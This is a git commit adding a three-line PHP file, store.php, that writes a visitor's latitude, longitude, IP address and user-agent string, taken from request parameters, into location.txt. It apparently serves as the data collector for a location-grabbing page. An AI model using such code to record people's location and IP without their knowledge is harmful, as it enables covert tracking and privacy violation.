d3650dbaf0387a2d5c106dcc1e1cb60d923e3615
shivansh2905 <109576951+shivansh2905@users.noreply.github.com>
2023-04-06 13:08:03 +0530

    Create store.php

---
+++ store.php
@@ -0,0 +1,3 @@
+<?php  
+$myfile = fopen("location.txt", "w"); $txt = "lat: " . $_GET["lat"] . "\nlong: " . $_GET["long"]  . "\nIP: " . $_SERVER["REMOTE_ADDR"] . "\nOS: " . $_GET["uagent"]; fwrite($myfile, $txt); fclose($myfile);   
+?>
